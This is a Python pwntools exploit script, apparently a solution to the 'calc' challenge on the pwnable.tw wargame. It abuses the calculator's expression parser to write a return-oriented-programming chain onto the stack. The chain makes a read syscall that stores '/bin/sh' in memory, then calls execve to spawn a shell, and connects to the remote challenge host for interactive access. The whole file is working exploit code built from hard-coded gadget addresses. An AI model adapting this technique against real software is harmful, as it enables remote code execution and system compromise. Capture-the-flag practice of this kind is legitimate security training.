#!/usr/bin/env python3

from pwn import *

sla = lambda p, d, x: p.sendlineafter(d, x)
sa = lambda p, d, x: p.sendafter(d, x)
sl = lambda p, x: p.sendline(x)
s = lambda p, x: p.send(x)

slan = lambda p, d, n: p.sendlineafter(d, str(n).encode())
san = lambda p, d, n: p.sendafter(d, str(n).encode())
sln = lambda p, n: p.sendline(str(n).encode())
sn = lambda p, n: p.send(str(n).encode())

ru = lambda p, x: p.recvuntil(x)
rl = lambda p: p.recvline()
rn = lambda p, n: p.recvn(n)
rr = lambda p, t: p.recvrepeat(timeout=t)
ra = lambda p, t: p.recvall(timeout=t)
ia = lambda p: p.interactive()

lg = lambda t, addr: print(t, '->', hex(addr))
binsh = lambda libc: next(libc.search(b"/bin/sh\x00"))
leak_bytes = lambda r, offset=0: u64(r.ljust(8, b"\0")) - offset
leak_hex = lambda r, offset=0: int(r, 16) - offset
leak_dec = lambda r, offset=0: int(r, 10) - offset
pad = lambda len=1, c=b'A': c * len

exe = ELF("calc_patched", checksec=False)

context.terminal = ["/usr/bin/tilix", "-a", "session-add-right", "-e", "bash", "-c"]
context.binary = exe

gdbscript = '''
cd ''' + os.getcwd() + '''
set solib-search-path ''' + os.getcwd() + '''
set sysroot /
b *0x0804912b
# b *0x0804914c
set follow-fork-mode parent
set detach-on-fork on
continue
'''

def conn():
    if args.LOCAL:
        p = process([exe.path])
        sleep(0.1)
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            sleep(1)
        return p
    else:
        host = "chall.pwnable.tw"
        port = 10100
        return remote(host, port)

p = conn()
sleep(1)

pop_eax_ret = 0x0805c34b
pop_ebx_edx_ret = 0x080701a9
pop_edx_ecx_ebx_ret = 0x080701d0
int_0x80_ret = 0x8070880
main = 0x8049452
sh = 0x80ed4d4 + 16

sla(p, b'calculator ===', flat(
    b'+00' * 8,
    b'+',
    str(pop_ebx_edx_ret - 1).encode(),
    b'*1+1+',
    str(1).encode(),
    b'*1-1+',
    str(0x31337 - 1).encode(),
    b'*1+1+',
    str(pop_eax_ret - 1).encode(),
    b'*1+1+',
    str(0x3 - 1).encode(),
    b'*1+1+',
    str(int_0x80_ret - 1).encode(),
    b'*1+1+',
    str(main).encode(),
    b'*1+0'
))

sleep(1)

s(p, pad(16, b'\0') + b'/bin/sh\0')

sla(p, b'calculator ===', flat(
    b'+00' * 8,
    b'+',
    str(pop_edx_ecx_ebx_ret - 1).encode(),
    b'*1+1+',
    str(1).encode(),
    b'*1-1+',
    str(1).encode(),
    b'*1-1+',
    str(sh - 1).encode(),
    b'*1+1+',
    str(pop_eax_ret - 1).encode(),
    b'*1+1+',
    str(0xb - 1).encode(),
    b'*1+1+',
    str(int_0x80_ret).encode(),
    b'*1+0',
))

rr(p, 1)
ia(p)